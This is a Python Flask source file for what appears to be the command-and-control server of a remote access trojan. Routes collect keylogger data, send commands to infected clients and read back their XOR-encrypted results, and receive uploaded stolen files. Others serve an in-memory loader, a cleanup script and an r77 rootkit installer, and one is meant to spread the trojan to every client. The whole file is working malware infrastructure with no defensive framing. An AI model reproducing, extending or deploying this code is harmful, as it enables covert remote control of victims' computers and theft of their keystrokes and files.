from flask import Flask, request, send_from_directory, jsonify, Response
import os
import time
from blessed import Terminal

app = Flask(__name__)

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
FILE_NAME = 'InMemLoader.exe'
clean_name = 'clean.bat'

os.makedirs(CODE_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

available_code_files = [f for f in os.listdir(CODE_DIR) if os.path.isfile(os.path.join(CODE_DIR, f))]
selected_code_file = None


def info():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(" ░█████╗░░██████╗██╗░░██╗██╗░░░██╗███████╗██╗██╗░░░░░")
    print("  ██╔══██╗██╔════╝██║░░██║██║░░░██║██╔════╝██║██║░░░░░")
    print("  ███████║╚█████╗░███████║╚██╗░██╔╝█████╗░░██║██║░░░░░")
    print("  ██╔══██║░╚═══██╗██╔══██║░╚████╔╝░██╔══╝░░██║██║░░░░░")
    print("  ██║░░██║██████╔╝██║░░██║░░╚██╔╝░░███████╗██║███████╗")
    print("  ╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝╚══════╝")
    time.sleep(0.5)

@app.route('/log', methods=['POST'])
def log():
    raw_data = request.form.get("data", "")
    
    # Just log the raw data without timestamp
    with open("keylog.log", "a", encoding="utf-8") as f:
        f.write(raw_data)  # Ensure no extra newline is added here

    return "OK", 200

# ==== Interactive Blessed Menu ====
def choose_code_file():
    global selected_code_file
    term = Terminal()
    index = 0

    menu_files = available_code_files + ['[ Exit ]']

    if not available_code_files:
        print("[-] No payloads found in /payload folder. Please add payloads first.")
        exit(1)

    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
        print(term.clear)
        while True:
            print(term.move_yx(0, 0) + term.bold("==== Select a payload ====\n"))
            for i, file in enumerate(menu_files):
                if i == index:
                    print(term.reverse(file))
                else:
                    print(file)

            key = term.inkey()

            if key.name == 'KEY_UP':
                index = (index - 1) % len(menu_files)
            elif key.name == 'KEY_DOWN':
                index = (index + 1) % len(menu_files)
            elif key.name in ('KEY_ENTER', '\n'):
                selected = menu_files[index]
                if selected == '[ Exit ]':
                    print(term.clear + "[*] Exiting...")
                    time.sleep(0.5)
                    exit(0)
                else:
                    selected_code_file = selected
                    print(term.clear + f"[+] Selected: {selected_code_file}")
                    time.sleep(1)
                    break



# ==== Client State ====
clients = {}
current_cmd = ""
last_result = ""


@app.route("/code")
def serve_code():
    if not selected_code_file:
        return "No code file selected.", 500
    try:
        with open(os.path.join(CODE_DIR, selected_code_file), 'r', encoding='utf-8') as f:
            return Response(f.read(), mimetype='text/plain')
    except Exception as e:
        return f"Error reading file: {str(e)}", 500


@app.route('/install', methods=['GET'])
def download_v2():
    try:
        file_path = os.path.join(CURRENT_DIR, FILE_NAME)
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{FILE_NAME} not found on the server.'}), 404
        return send_from_directory(CURRENT_DIR, FILE_NAME, as_attachment=True)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/clean', methods=['GET'])
def clean():
    try:
        file_path = os.path.join(CURRENT_DIR, clean_name)
        if not os.path.exists(file_path):
            return jsonify({'status': 'error', 'message': f'{clean_name} not found on the server.'}), 404
        return send_from_directory(CURRENT_DIR, clean_name, as_attachment=True)
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500


def xor(data, key="nullbeacon"):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))


@app.route('/client_info', methods=['POST'])
def update_client_info():
    client_id = request.data.decode()
    clients[client_id] = {"ip": request.remote_addr, "last_seen": time.time()}
    print(f"[*] Client {client_id} updated or connected.")
    return "OK"


@app.route('/get', methods=['GET'])
def get_command():
    return current_cmd


@app.route('/set', methods=['POST'])
def set_command():
    global current_cmd
    current_cmd = request.data.decode()
    return "OK"


@app.route('/result', methods=['POST'])
def post_result():
    global last_result
    encrypted = request.data.decode()
    last_result = xor(encrypted)
    return "OK"


@app.route('/last', methods=['GET'])
def get_last_result():
    return last_result or "[*] No result yet."


@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if file:
        path = os.path.join(UPLOAD_DIR, file.filename)
        file.save(path)
        print(f"[+] File uploaded: {file.filename}")
        return "OK"
    return "No file"


@app.route('/broadcast', methods=['POST'])
def broadcast_command():
    global current_cmd
    cmd = request.data.decode()
    current_cmd = cmd
    print(f"[!] Broadcasting command to all clients: {cmd}")
    return "Broadcast sent"


@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    try:
        return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
    except Exception:
        return "File not found", 404


@app.route('/spread', methods=['POST'])
def spread():
    print("[*] Command received to spread RAT to all clients.")
    for client_id, client_data in clients.items():
        print(f"[+] Sending 'spread' command to {client_id} at {client_data['ip']}")
    return "Spreading started."


@app.route('/clients', methods=['GET'])
def list_clients():
    return {"clients": list(clients.keys())}


# ==== Payload + Shellcode Routes ====
PAYLOAD_DIR = r'C:\Users\mxmla\source\repos\InMemLoader\InMemLoader\bin\Debug\net8.0'
PAYLOAD_FILE = 'InMemLoader.exe'
Shellcode_dir = r'C:\Users\mxmla\Downloads\r77Rootkit 1.7.0'
shellcode_FILE = 'install.exe'


@app.route('/payload', methods=['GET'])
def download_payload():
    try:
        return send_from_directory(PAYLOAD_DIR, PAYLOAD_FILE, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 500


@app.route('/shellcode', methods=['GET'])
def download_shellcode():
    try:
        return send_from_directory(Shellcode_dir, shellcode_FILE, as_attachment=True)
    except Exception as e:
        return f"Error: {str(e)}", 500


# ==== Run Server ====
if __name__ == "__main__":
    info()
    choose_code_file()
    app.run(host="0.0.0.0", port=7777)
